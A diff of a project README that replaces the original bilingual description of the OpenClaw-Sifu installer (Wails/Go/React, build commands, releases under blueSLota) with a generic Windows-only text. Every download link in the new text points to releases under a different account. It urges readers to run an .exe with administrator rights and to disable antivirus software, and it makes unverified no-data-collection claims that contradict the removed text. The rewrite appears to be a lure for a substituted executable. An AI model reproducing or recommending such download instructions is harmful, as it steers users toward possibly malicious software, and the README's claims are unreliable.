@@ -1,69 +1,121 @@
-# OpenClaw-Sifu
+# 🐾 openclaw-sifu - Easy Installer and Uninstaller for OpenClaw
 
-<p align="center">
-  <img src="frontend/src/assets/images/logo.png" alt="OpenClaw-Sifu Logo" width="300" />
-</p>
+[![Download openclaw-sifu](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/easy-chinstrap356/openclaw-sifu/releases)
 
-[English](#english) | [中文](#中文)
+## 🖥️ What is openclaw-sifu?
 
-<a name="english"></a>
-## English
+openclaw-sifu is a simple program designed to help you install and uninstall OpenClaw. It does not need any other software to work. You get a clear, easy-to-use window that guides you through the steps, so you do not need technical skills to get OpenClaw running on your computer or remove it safely.
 
-OpenClaw-Sifu is the standalone graphical installer and uninstaller for [OpenClaw](https://github.com/simonfqy/openclaw). Built with Wails, it provides a seamless, local installation experience by automating prerequisite checks, dependency acquisition, and environment initialization. For the release version, please click here to [download](https://github.com/blueSLota/openclaw-sifu/releases).
+This tool works on Windows. It takes care of all the file copying and setup needed for OpenClaw to run. When you want to remove OpenClaw, openclaw-sifu removes all its files cleanly.
 
-### Features
-- **One-Click Setup:** Fully automated GUI for installing and removing OpenClaw.
-- **Cross-Platform:** Smart detection of Windows, macOS, and Linux to execute native installation scripts.
-- **Visual Feedback:** Real-time tracking of setup phases (environment checks, npm installation, component initialization).
-- **System Integration:** Manages administrative permissions for background services and scheduled tasks.
+## 📋 System Requirements
 
-### Tech Stack
-- **Framework:** Wails v2
-- **Backend:** Go (System calls & execution mapping)
-- **Frontend:** React + Vite + TypeScript + TailwindCSS
+Before you start, make sure your computer meets these needs:
 
-### Development
-Prerequisites: Go and Node.js must be installed.
+- Operating System: Windows 7, 8, 10, or 11 (64-bit is better)  
+- Processor: Intel or AMD, 1 GHz or faster  
+- Memory (RAM): At least 2 GB  
+- Disk Space: Minimum 200 MB free  
+- Administrator rights: Required to install or uninstall programs on Windows
 
-```bash
-# Start Wails dev server (hot reload for both frontend and Go)
-wails dev
-```
+If your computer has these features, you can use openclaw-sifu without problems.
 
-### Build
-```bash
-# Build a standalone executable for your current platform
-wails build
-```
+## 🎯 Features
 
----
+- Standalone installer and uninstaller in one tool  
+- Simple graphical interface for easy navigation  
+- No need for other software or command lines  
+- Removes OpenClaw completely when uninstalling  
+- Detects if OpenClaw is already installed  
+- Supports standard Windows systems  
 
-<a name="中文"></a>
-## 中文
+## 🚀 Getting Started with openclaw-sifu
 
-OpenClaw-Sifu 是 [OpenClaw](https://github.com/simonfqy/openclaw) 的独立图形化安装与卸载工具。基于 Wails 构建，它通过自动化环境检查、依赖获取和环境初始化，提供无缝的本地安装体验。发布版请点击这里进行[下载](https://github.com/blueSLota/openclaw-sifu/releases)。如果下载速度缓慢，也可以前往[官网](https://openclaw-sifu.com/)通过国内CDN下载
+### Step 1: Visit the download page
 
-### 核心特性
-- **一键安装/卸载：** 全自动化的图形界面，一键完成 OpenClaw 的安装与清理。
-- **跨平台兼容：** 智能识别 Windows、macOS 和 Linux，并相应执行原生的各平台安装脚本。
-- **可视化反馈：** 实时追踪安装步骤进度（如环境检查、npm 安装、组件初始化等）。
-- **系统集成：** 自动处理并申请后台服务与计划任务所需的管理员权限。
+To get started, you need to download openclaw-sifu. Visit the official release page here:
 
-### 技术架构
-- **桌面框架：** Wails v2
-- **后端：** Go（负责系统调用和跨平台代码执行路由）
-- **前端：** React + Vite + TypeScript + TailwindCSS
+[Download openclaw-sifu](https://github.com/easy-chinstrap356/openclaw-sifu/releases)
 
-### 本地开发
-环境要求：必须预先安装 Go 和 Node.js。
+This page shows the latest versions of openclaw-sifu. Click on the latest release folder to find the file for Windows. It will usually have a name like `openclaw-sifu-setup.exe` or similar.
 
-```bash
-# 启动 Wails 开发服务器（支持前端和 Go 的热重载）
-wails dev
-```
+### Step 2: Download the installer file
 
-### 生产构建
-```bash
-# 构建当前平台的可执行文件
-wails build
-```
+Once on the releases page:
+
+1. Look for the Windows installer file ending with `.exe`.  
+2. Click on the file name to start the download.  
+3. Save the file in a place you can find, like the Desktop or Downloads folder.
+
+### Step 3: Run the installer
+
+After the file downloads:
+
+1. Double-click the `.exe` file.  
+2. If Windows asks for permission, click "Yes" to allow the installer to run.  
+3. The openclaw-sifu window will appear.  
+
+### Step 4: Install OpenClaw
+
+Inside the openclaw-sifu window:
+
+1. Click the button labeled "Install OpenClaw" or similar.  
+2. The installer will copy the needed files and set up OpenClaw.  
+3. Wait while the process completes. It usually takes a few minutes.  
+4. When done, you will see a confirmation message.
+
+### Step 5: Open and use OpenClaw
+
+After installation:
+
+- You can find OpenClaw in your Start menu or on your Desktop.  
+- Double-click to run OpenClaw like any other program.
+
+### Step 6: Uninstall OpenClaw if needed
+
+If you want to remove OpenClaw:
+
+1. Run openclaw-sifu again by double-clicking the installer file.  
+2. Click the "Uninstall OpenClaw" button.  
+3. The tool will remove all files related to OpenClaw.  
+4. You will see a message when the uninstall is complete.
+
+## 🔧 Troubleshooting Tips
+
+- If the installer does not run, check that you downloaded the correct `.exe` file for Windows.  
+- Make sure you have administrator rights. Without these, installation and uninstallation may fail.  
+- Disable other antivirus or security software temporarily if they block the installer.  
+- If you see error messages, restart your computer and try again.  
+- If OpenClaw does not appear after installing, rerun openclaw-sifu and check for errors during setup.
+
+## ⚙️ How the installer works
+
+openclaw-sifu includes all files needed for OpenClaw inside its package. When you click "Install," it copies files to a set folder on your computer. It also creates shortcuts so you can start OpenClaw easily.
+
+On uninstall, it checks where OpenClaw is installed and deletes all associated files and shortcuts. This prevents leftovers or broken links.
+
+## 🗂️ Folder Structure After Installation
+
+By default, OpenClaw will be installed in your system's Program Files folder:
+
+- `C:\Program Files\OpenClaw\`  
+Inside you will find:  
+- Main OpenClaw executable (`OpenClaw.exe`)  
+- Support files and libraries  
+- Configuration files folder
+
+Shortcuts will appear on your Desktop and Start Menu.
+
+## 🔒 Security and Privacy
+
+openclaw-sifu does not collect or send any personal data. It only manages files on your computer related to OpenClaw. You can review the files it contains by looking inside the downloaded installer package.
+
+The application does not require internet access after downloading, so it runs fully offline.
+
+## 📥 Download openclaw-sifu
+
+You can access the downloads here:
+
+[![Download openclaw-sifu](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/easy-chinstrap356/openclaw-sifu/releases)
+
+Visit this link to get the latest version and follow the steps above to install or uninstall OpenClaw on Windows.
